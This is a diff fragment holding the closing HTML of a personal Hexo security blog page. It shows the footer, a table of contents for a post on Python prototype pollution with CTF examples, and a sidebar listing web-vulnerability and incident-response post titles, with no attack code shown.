+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:1844015967@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/nihao5577" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">污染方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#merge%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">merge函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pydash"><span class="toc-number">2.1.2.</span> <span class="toc-text">pydash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E6%9C%89%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%B1%9E%E6%80%A7"><span class="toc-number">2.2.1.</span> <span class="toc-text">污染有继承关系属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%97%A0%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E7%9A%84%E7%B1%BB%E5%B1%9E%E6%80%A7%E6%88%96%E8%80%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">修改无继承关系的类属性或者全局变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.</span> <span class="toc-text">实例:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NCTF-ez-dash-ez-dash-revenge"><span class="toc-number">2.3.1.</span> <span class="toc-text">[NCTF]ez_dash &amp; ez_dash_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idekctf2022-task-manager"><span class="toc-number">2.3.2.</span> <span class="toc-text">[idekctf2022]task manager</span></a></li></ol></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/flask%20pin%E7%A0%81%E8%AE%A1%E7%AE%97&%E5%88%A9%E7%94%A8/">flask pin码计算</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Nodejs原型链污染&命令执行</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">php filter链</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pickle反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/XS-Leaks/">XSleak</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件包含&文件上传(主php)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/sql/">sql小总结</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/xpath%E6%B3%A8%E5%85%A5/">Xpath注入</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">py原型链污染</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">不只是日志分析-windows篇</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/">应急响应常见题目</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/redis/">redis攻击手法</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="web漏洞">
+                <span class="iconfont-archer">&#xe606;</span>
+                web漏洞
+            </span>
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="侧信道">
+                <span class="iconfont-archer">&#xe606;</span>
+                侧信道
+            </span>
+            <span class="sidebar-tag-name" data-tags="nodejs">
+                <span class="iconfont-archer">&#xe606;</span>
+                nodejs
+            </span>
+            <span class="sidebar-tag-name" data-tags="注入">
+                <span class="iconfont-archer">&#xe606;</span>
+                注入
+            </span>
+            <span class="sidebar-tag-name" data-tags="windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows
+            </span>
+            <span class="sidebar-tag-name" data-tags="日志分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                日志分析
+            </span>
+            <span class="sidebar-tag-name" data-tags="应急响应">
+                <span class="iconfont-archer">&#xe606;</span>
+                应急响应
+            </span>
+            <span class="sidebar-tag-name" data-tags="redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                redis
+            </span>
+            <span class="sidebar-tag-name" data-tags="总结">
+                <span class="iconfont-archer">&#xe606;</span>
+                总结
+            </span>
+            <span class="sidebar-tag-name" data-tags="流量分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                流量分析
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="web漏洞">
+            <span class="iconfont-archer">&#xe60a;</span>
+            web漏洞
+        </span>
+        <span class="sidebar-category-name" data-categories="应急响应">
+            <span class="iconfont-archer">&#xe60a;</span>
+            应急响应
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "夏饭orz"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+    <!-- Check browser compatibility of CSS variables -->
+    <script>
+        if (browserSupportCSSVariables === undefined) {
+            var browserSupportCSSVariables = window.CSS && window.CSS.supports && window.CSS.supports('--a', 0);
+        }
+    </script>
+    <script>
+        if (browserSupportCSSVariables) {
+            var customFontName = 'Noto Sans SC:n3,n4,n5,n7'
+            var customFontUrl = 'https://chinese-fonts-cdn.deno.dev/packages/ysbth/dist/%E4%BC%98%E8%AE%BE%E6%A0%87%E9%A2%98%E9%BB%91/result.css'
+            if (!customFontName) {
+                console.log('Custom font name is not set or read failed');
+            }
+            if (!customFontUrl) {
+                console.log('Custom font url is not set or read failed');
+            }
+        } else {
+            console.error('Current browser doesn\'t support custom font.')
+        }
+    </script>
+    <script src="/scripts/customFontLoader.js" defer></script>
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
